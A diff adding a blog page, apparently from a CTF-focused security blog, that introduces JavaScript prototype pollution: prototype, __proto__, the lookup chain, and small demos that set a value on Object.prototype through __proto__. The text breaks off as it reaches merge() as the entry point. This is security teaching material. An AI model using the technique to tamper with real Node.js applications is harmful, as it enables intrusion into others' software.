@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
+  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="pollution_start!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript原型链污染">
+<meta property="og:url" content="https://baozongwi.xyz/posts/5d5d07b8.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="pollution_start!">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-201336.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213320.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213443.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213540.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213703.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-141434.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-155440.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-155511.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-141910.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-142004.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-193214.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-194958.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-195837.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-205355.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-205456.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-210535.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-212014.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-212252.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-213530.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-213633.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-215622.jpg">
+<meta property="article:published_time" content="2025-01-31T11:25:47.000Z">
+<meta property="article:modified_time" content="2025-08-08T04:04:13.431Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="姿势">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-201336.jpg">
+
+
+<link rel="canonical" href="https://baozongwi.xyz/posts/5d5d07b8.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/5d5d07b8.html","path":"posts/5d5d07b8.html","title":"JavaScript原型链污染"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JavaScript原型链污染 | baozongwi:H@cking Th3 Fu1ure</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02"><span class="nav-number">2.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#prototype-proto"><span class="nav-number">2.1.</span> <span class="nav-text">prototype&amp;&amp;__proto__</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF"><span class="nav-number">2.2.</span> <span class="nav-text">继承</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">2.3.</span> <span class="nav-text">应用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo"><span class="nav-number">2.4.</span> <span class="nav-text">demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ctfshow-nodejs%E4%B8%93%E9%A2%98"><span class="nav-number">2.4.1.</span> <span class="nav-text">ctfshow_nodejs专题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ejs%E7%BB%8F%E5%85%B8%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.4.2.</span> <span class="nav-text">ejs经典审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jade%E7%BB%8F%E5%85%B8%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.4.3.</span> <span class="nav-text">jade经典审计</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03 小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baozongwi"
+      src="/images/acvtar.jpg">
+  <p class="site-author-name" itemprop="name">baozongwi</p>
+  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">202</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+<ul>
+  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
+  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
+  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
+  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
+  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/5d5d07b8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/acvtar.jpg">
+      <meta itemprop="name" content="baozongwi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="天地不仁，以万物为刍狗">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JavaScript原型链污染 | baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="pollution_start!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JavaScript原型链污染
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-01-31 19:25:47" itemprop="dateCreated datePublished" datetime="2025-01-31T19:25:47+08:00">2025-01-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-08-08 12:04:13" itemprop="dateModified" datetime="2025-08-08T12:04:13+08:00">2025-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/talk/" itemprop="url" rel="index"><span itemprop="name">talk</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>18 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">pollution_start!</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>前面很早就知道有这个姿势，但是一直拖欠，包括打ctfshow的时候也是一把锁，后面学了flask的原型链污染觉得很有意思，来学习一下，把坑填了</p>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h2 id="prototype-proto"><a href="#prototype-proto" class="headerlink" title="prototype&amp;&amp;__proto__"></a><code>prototype</code>&amp;&amp;<code>__proto__</code></h2><p>零基础没关系，我们只要知道属性这个东西就可以，最简单的demo</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span>=<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+<p>就可以看到打印出来了<code>1</code>，但是如果我们不仅仅是只创建了这一个对象，而是很多个<code>Foo</code>，那我们每次都要新建一个<code>show</code>方法，对此，我们可以利用<code>prototype</code>来完成</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span>=<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;;</span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+<p><code>prototype</code>是个啥呢，我们在代码中就可以看出是一个属性，并且<code>Foo.prototype</code>是等效于<code>Foo()</code>原型的，看看官方文档</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-201336.jpg" alt="1"></p>
+<p>文档其中也意识到了利用这个属性访问原型进行覆盖属性的问题，也就是原型链污染问题，但是要想这么利用我们必须要拿到<code>Foo()</code>，如果我们是生成出来的对象呢，如何访问原型</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">test</span>=<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;win&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">test</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a.<span class="property">__proto__</span>==<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Yees&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用<code>__proto__</code>，相信很多师傅，经常在一些简单的题目中使用到这个属性，而这么一看我们很容易就知道<code>a.__proto__==Foo.prototype</code>，也就是说<code>prototype</code>是一个属性，每个对象都有，且可通过他访问所有对象的原型(此例中为Foo)，<code>__proto__</code>为一个属性，可以利用来访问对象的<code>prototype</code>属性，最后达到访问原型的效果</p>
+<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>知道了上面两个属性之后，我们就很容易像<code>flask</code>的一样做实验了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="comment">// this.last_name = &#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"><span class="comment">// Object.prototype.last_name = &#x27;Trump&#x27;</span></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里的回显是<code>Name: Melania undefined</code>，而为什么会造成这样的结果，</p>
+<blockquote>
+<p>JavaScript 对象是动态的“包”属性（称为<strong>自己的属性</strong>）。JavaScript 对象具有指向原型对象的链接。当尝试访问对象的属性时，不仅会在对象上搜索该属性，还会在对象的原型、原型的原型上查找该属性，依此类推，直到找到具有匹配名称的属性或到达原型链的末尾。</p>
+</blockquote>
+<p>其中的末尾指的是<code>Object.prototype</code>如果还找不到就是<code>null</code>也就是我们刚刚输出的未定义了，用P牛的话总结一下机制是</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p>开干，写个最简单的demo进行值的覆盖</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>,foo.<span class="property">__proto__</span>)</span><br><span class="line"></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"><span class="comment">// Object.prototype.bar = &#x27;Trump&#x27;</span></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>
+
+<p>验证污染可行的同时也验证了我们刚才说的查找顺序</p>
+<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>在ctfshow刷题的时候我就一直很苦恼，甚至被狠狠的折磨，因为有时候手写payload就是不容易一次写对对于新手来说，但是我发现后面靶机无论如何也不能污染成功了，原因是<strong>因为一旦污染了原型链，除非整个程序重启，否则所有的对象都会被污染与影响。</strong>回到正题应用场景这个应该是耳熟能详的了，就是类似的<code>merge</code>函数功能都可以，这里进行Debug还是以<code>merge</code>为例子</p>
